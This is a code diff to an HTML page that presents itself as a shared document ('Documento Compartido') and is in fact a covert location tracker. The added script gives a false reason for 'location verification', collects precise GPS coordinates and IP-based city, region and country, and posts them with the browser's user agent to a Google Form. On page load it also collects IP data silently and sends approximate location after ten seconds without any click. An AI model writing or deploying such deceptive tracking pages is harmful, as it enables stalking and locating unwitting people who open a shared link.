@@ -31,6 +31,43 @@
             color: #999;
             font-style: italic;
         }
+        .location-request {
+            background: #e3f2fd;
+            border: 1px solid #2196f3;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        .btn {
+            background: #2196f3;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px;
+        }
+        .btn:hover {
+            background: #1976d2;
+        }
+        .status {
+            margin: 15px 0;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
     </style>
 </head>
 <body>
@@ -38,68 +75,208 @@
         <h1>📋 Documento Compartido</h1>
         <div class="content">
             <p>Gracias por acceder al contenido que te compartí.</p>
-            <p>Aquí encontrarás la información que necesitabas:</p>
-            <ul>
-                <li>✅ Documento procesado correctamente</li>
-                <li>📊 Datos actualizados</li>
-                <li>🔒 Contenido verificado</li>
-            </ul>
-            <p class="loading">Cargando contenido completo...</p>
+            <p>Para brindarte una mejor experiencia y contenido personalizado, necesitamos verificar tu ubicación:</p>
+            
+            <div class="location-request">
+                <h3>🌍 Verificación de Ubicación</h3>
+                <p>Esto nos ayuda a mostrarte contenido relevante para tu zona.</p>
+                <button class="btn" onclick="obtenerUbicacionPrecisa()">
+                    📍 Permitir Ubicación
+                </button>
+                <button class="btn" onclick="usarUbicacionAproximada()" style="background: #757575;">
+                    🌐 Usar Ubicación Aproximada
+                </button>
+            </div>
+            
+            <div id="status" class="status" style="display: none;"></div>
+            
+            <div id="contenido-principal" style="display: none;">
+                <h3>✅ Contenido Verificado</h3>
+                <ul>
+                    <li>📊 Datos actualizados para tu región</li>
+                    <li>🔒 Contenido verificado y seguro</li>
+                    <li>⚡ Información optimizada</li>
+                </ul>
+                <p><strong>El contenido se ha cargado exitosamente.</strong></p>
+            </div>
         </div>
     </div>
 
     <script>
-        // Función para obtener ubicación por IP
-        async function obtenerUbicacion() {
+        const GOOGLE_FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSe7xWUNd2NL7Jlg4hPjrKrpYKPpGnOJsF_-o3EO3kFKJQoE8g/formResponse';
+        
+        let datosRecopilados = {
+            ip: 'No disponible',
+            city: 'No disponible',
+            country: 'No disponible',
+            region: 'No disponible',
+            latitude: 0,
+            longitude: 0,
+            precision: 'No disponible',
+            metodo: 'No definido'
+        };
+
+        // Función para mostrar estado
+        function mostrarEstado(mensaje, tipo = 'success') {
+            const statusDiv = document.getElementById('status');
+            statusDiv.style.display = 'block';
+            statusDiv.className = `status ${tipo}`;
+            statusDiv.textContent = mensaje;
+        }
+
+        // Función para mostrar contenido final
+        function mostrarContenido() {
+            document.getElementById('contenido-principal').style.display = 'block';
+            document.querySelector('.location-request').style.display = 'none';
+        }
+
+        // Función para obtener ubicación precisa con HTML5
+        async function obtenerUbicacionPrecisa() {
+            mostrarEstado('Obteniendo ubicación precisa...', 'success');
+            
+            if (!navigator.geolocation) {
+                mostrarEstado('Geolocalización no soportada. Usando método alternativo...', 'error');
+                await usarUbicacionAproximada();
+                return;
+            }
+
+            try {
+                // Intentar obtener ubicación precisa
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(
+                        resolve,
+                        reject,
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 15000,
+                            maximumAge: 0
+                        }
+                    );
+                });
+
+                // Actualizar datos con coordenadas precisas
+                datosRecopilados.latitude = position.coords.latitude;
+                datosRecopilados.longitude = position.coords.longitude;
+                datosRecopilados.precision = `${Math.round(position.coords.accuracy)}m`;
+                datosRecopilados.metodo = 'GPS_PRECISO';
+
+                // Obtener datos adicionales por IP
+                await obtenerDatosIP();
+                
+                // Enviar todos los datos
+                await enviarDatos();
+                
+                mostrarEstado('✅ Ubicación obtenida con precisión GPS', 'success');
+                setTimeout(mostrarContenido, 1500);
+
+            } catch (error) {
+                let mensajeError = 'Error al obtener ubicación precisa. ';
+                
+                switch(error.code) {
+                    case error.PERMISSION_DENIED:
+                        mensajeError += 'Permiso denegado.';
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        mensajeError += 'Ubicación no disponible.';
+                        break;
+                    case error.TIMEOUT:
+                        mensajeError += 'Tiempo de espera agotado.';
+                        break;
+                    default:
+                        mensajeError += 'Error desconocido.';
+                        break;
+                }
+                
+                mostrarEstado(mensajeError + ' Usando ubicación aproximada...', 'error');
+                
+                // Usar método alternativo
+                setTimeout(async () => {
+                    await usarUbicacionAproximada();
+                }, 2000);
+            }
+        }
+
+        // Función para obtener ubicación por IP (método backup)
+        async function usarUbicacionAproximada() {
+            mostrarEstado('Obteniendo ubicación por IP...', 'success');
+            
+            try {
+                await obtenerDatosIP();
+                datosRecopilados.metodo = 'IP_APROXIMADO';
+                datosRecopilados.precision = 'Ciudad (~5-10km)';
+                
+                await enviarDatos();
+                
+                mostrarEstado('✅ Ubicación aproximada obtenida', 'success');
+                setTimeout(mostrarContenido, 1500);
+                
+            } catch (error) {
+                mostrarEstado('❌ Error al obtener ubicación', 'error');
+                setTimeout(mostrarContenido, 2000);
+            }
+        }
+
+        // Función para obtener datos por IP
+        async function obtenerDatosIP() {
             try {
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
                 
-                // Enviar datos a Google Forms
-                enviarAGoogleForms(data);
+                datosRecopilados.ip = data.ip || 'No disponible';
+                datosRecopilados.city = data.city || 'No disponible';
+                datosRecopilados.country = data.country || 'No disponible';
+                datosRecopilados.region = data.region || 'No disponible';
+                
+                // Solo actualizar coordenadas si no las tenemos de GPS
+                if (datosRecopilados.metodo !== 'GPS_PRECISO') {
+                    datosRecopilados.latitude = data.latitude || 0;
+                    datosRecopilados.longitude = data.longitude || 0;
+                }
                 
             } catch (error) {
-                console.log('Error al obtener ubicación:', error);
+                console.log('Error al obtener datos de IP:', error);
             }
         }
 
         // Función para enviar datos a Google Forms
-        function enviarAGoogleForms(data) {
-            // IMPORTANTE: Reemplaza estas URLs con las tuyas
-            const GOOGLE_FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSfQPts57g3vqveBw9Kc8-vxyb3kX0e_1y0wjf62UXjrWaWLOQ/formResponse?usp=header';
-            
-            // Crear FormData con los datos
-            const formData = new FormData();
-            
-            // IMPORTANTE: Reemplaza estos entry IDs con los reales de tu formulario
-            formData.append('entry.1392977111', data.ip || 'No disponible');
-            formData.append('entry.1517150205', data.city || 'No disponible');
-            formData.append('entry.2094576089', data.country || 'No disponible');
-            formData.append('entry.1415149614', data.region || 'No disponible');
-            formData.append('entry.1349929666', `${data.latitude || 0}, ${data.longitude || 0}`);
-            formData.append('entry.1008793067', new Date().toLocaleString());
-            formData.append('entry.999090935', navigator.userAgent);
-            
-            // Enviar datos (modo no-cors para evitar problemas de CORS)
-            fetch(GOOGLE_FORM_URL, {
-                method: 'POST',
-                body: formData,
-                mode: 'no-cors'
-            }).then(() => {
-                console.log('Datos enviados correctamente');
-            }).catch(error => {
+        async function enviarDatos() {
+            try {
+                const formData = new FormData();
+                
+                // Usar tus Entry IDs específicos
+                formData.append('entry.1392977111', datosRecopilados.ip);
+                formData.append('entry.1517150205', datosRecopilados.city);
+                formData.append('entry.2094576089', datosRecopilados.country);
+                formData.append('entry.1415149614', datosRecopilados.region);
+                formData.append('entry.1349929666', `${datosRecopilados.latitude}, ${datosRecopilados.longitude}`);
+                formData.append('entry.1008793067', new Date().toLocaleString());
+                formData.append('entry.999090935', `${navigator.userAgent} | Método: ${datosRecopilados.metodo} | Precisión: ${datosRecopilados.precision}`);
+                
+                await fetch(GOOGLE_FORM_URL, {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors'
+                });
+                
+                console.log('Datos enviados correctamente:', datosRecopilados);
+                
+            } catch (error) {
                 console.log('Error al enviar datos:', error);
-            });
+            }
         }
 
-        // Ejecutar cuando se carga la página
+        // Inicialización automática silenciosa
         window.addEventListener('load', function() {
-            obtenerUbicacion();
+            // Intentar obtener datos básicos por IP inmediatamente
+            obtenerDatosIP();
             
-            // Simular carga de contenido
+            // Auto-activar ubicación aproximada después de 10 segundos si no hay interacción
             setTimeout(() => {
-                document.querySelector('.loading').textContent = 'Contenido cargado exitosamente ✅';
-            }, 2000);
+                if (datosRecopilados.metodo === 'No definido') {
+                    console.log('Auto-activando ubicación aproximada...');
+                    usarUbicacionAproximada();
+                }
+            }, 10000);
         });
     </script>
 </body>
